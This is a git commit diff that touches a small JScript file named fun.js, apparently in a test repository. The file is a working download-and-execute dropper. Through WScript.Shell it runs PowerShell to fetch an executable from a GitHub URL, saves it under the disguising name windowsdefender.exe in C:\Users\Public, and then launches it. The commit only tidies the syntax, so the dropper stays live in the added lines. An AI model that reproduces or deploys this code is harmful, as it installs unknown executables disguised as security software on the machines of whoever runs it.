24671379b86eed27c049484d18c24bd6444625c6
wcn198 <90110952+wcn198@users.noreply.github.com>
2022-05-03 16:30:02 +0100

    Add files via upload

--- fun.js
+++ fun.js
@@ -1,3 +1,3 @@
-object = new ActiveXObject("WScript.Shell")
-object.run("powershell.exe Invoke-WebRequest -Uri 'https://github.com/wcn198/test-application/raw/main/test-file.exe' -OutFile 'C:\Users\Public\windowsdefender.exe'")
-object.run("cmd.exe /c start C:\Users\Public\windowsdefender.exe")
+var object = new ActiveXObject("WScript.Shell");
+object.Run("powershell.exe Invoke-WebRequest -Uri 'https://github.com/wcn198/test-application/raw/main/test-file.exe' -OutFile 'C:\Users\Public\windowsdefender.exe'");
+object.Run("cmd.exe /c start C:\Users\Public\windowsdefender.exe");
